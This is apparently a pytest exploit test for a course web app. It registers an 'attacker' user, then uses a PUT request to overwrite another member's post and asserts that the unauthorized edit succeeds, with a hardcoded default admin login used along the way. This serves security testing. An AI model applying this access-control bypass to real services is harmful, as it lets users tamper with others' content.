import sqlite3
from datetime import datetime, timezone

import requests

from helpers import get_user_id, get_row


def _now_iso():
    return datetime.now(timezone.utc).replace(microsecond=0).isoformat()


def api_post(session, url, json=None):
    return session.post(url, json=json, timeout=5)


def api_put(session, url, json=None):
    return session.put(url, json=json, timeout=5)


def api_get(session, url):
    return session.get(url, timeout=5)


def api_logout(session, base_url):
    return session.post(f"{base_url}/api/auth/logout", timeout=5)


def force_add_member_db(db_path, course_id, username, role_in_course):
    """
    Test-only helper: insert/update membership with required NOT NULL fields.
    Auto-detects whether created_at/updated_at columns exist.
    """
    conn = sqlite3.connect(str(db_path))
    try:
        row = conn.execute("SELECT user_id FROM users WHERE username=?", (username,)).fetchone()
        assert row is not None, f"user not found: {username}"
        user_id = int(row[0])

        cols = [r[1] for r in conn.execute("PRAGMA table_info(memberships)").fetchall()]
        now = _now_iso()

        existing = conn.execute(
            "SELECT membership_id FROM memberships WHERE course_id=? AND user_id=?",
            (course_id, user_id),
        ).fetchone()

        if existing:
            if "updated_at" in cols:
                conn.execute(
                    "UPDATE memberships SET role_in_course=?, updated_at=? WHERE course_id=? AND user_id=?",
                    (role_in_course, now, course_id, user_id),
                )
            else:
                conn.execute(
                    "UPDATE memberships SET role_in_course=? WHERE course_id=? AND user_id=?",
                    (role_in_course, course_id, user_id),
                )
        else:
            insert_cols = ["course_id", "user_id", "role_in_course"]
            insert_vals = [course_id, user_id, role_in_course]

            if "created_at" in cols:
                insert_cols.append("created_at")
                insert_vals.append(now)
            if "updated_at" in cols:
                insert_cols.append("updated_at")
                insert_vals.append(now)

            placeholders = ",".join(["?"] * len(insert_cols))
            sql = f"INSERT INTO memberships({','.join(insert_cols)}) VALUES({placeholders})"
            conn.execute(sql, tuple(insert_vals))

        conn.commit()
    finally:
        conn.close()


def test_exploit_course_member_can_edit_another_members_post(app_instance):
    base_url = app_instance["base_url"]
    db_path = app_instance["db_path"]

    s = requests.Session()
    s.headers.update({"Accept": "application/json"})

    # 1) login as default admin
    r = api_post(s, f"{base_url}/api/auth/login", {"username": "admin", "password": "admin123"})
    assert r.status_code == 200, r.text

    # 2) create course
    r = api_post(s, f"{base_url}/api/courses", {"title": "Posts", "description": "demo"})
    assert r.status_code in (200, 201), r.text
    course_id = r.json()["course_id"]

    # 3) sanity: members endpoint works
    r = api_get(s, f"{base_url}/api/courses/{course_id}/members")
    assert r.status_code == 200, r.text

    # 4) register author + attacker
    r = api_post(s, f"{base_url}/api/auth/register", {"username": "author_u", "password": "pass123", "display_name": "Author"})
    assert r.status_code in (200, 201), r.text
    r = api_post(s, f"{base_url}/api/auth/register", {"username": "attacker_u", "password": "pass123", "display_name": "Attacker"})
    assert r.status_code in (200, 201), r.text

    author_id = get_user_id(db_path, "author_u")
    attacker_id = get_user_id(db_path, "attacker_u")
    assert author_id is not None
    assert attacker_id is not None

    # 5) scenario build: force add both as course members via DB
    force_add_member_db(db_path, course_id, "author_u", "student")
    force_add_member_db(db_path, course_id, "attacker_u", "student")

    # 6) login as author and create post
    r = api_logout(s, base_url)
    assert r.status_code in (200, 204), r.text

    r = api_post(s, f"{base_url}/api/auth/login", {"username": "author_u", "password": "pass123"})
    assert r.status_code == 200, r.text

    r = api_post(s, f"{base_url}/api/courses/{course_id}/posts", {"title": "Original", "body": "Body"})
    assert r.status_code in (200, 201), r.text
    post_id = r.json()["post_id"]

    # 7) login as attacker and update someone else's post (exploit)
    r = api_logout(s, base_url)
    assert r.status_code in (200, 204), r.text

    r = api_post(s, f"{base_url}/api/auth/login", {"username": "attacker_u", "password": "pass123"})
    assert r.status_code == 200, r.text

    r = api_put(
        s,
        f"{base_url}/api/courses/{course_id}/posts/{post_id}",
        {"title": "Hacked", "body": "Owned by peer"},
    )
    assert r.status_code == 200, r.text

    # 8) verify DB changed but author_id stays as author_u
    changed = get_row(db_path, "SELECT title, body, author_id FROM posts WHERE post_id=?", (post_id,))
    assert changed["author_id"] == author_id
    assert changed["title"] == "Hacked"
    assert changed["body"] == "Owned by peer"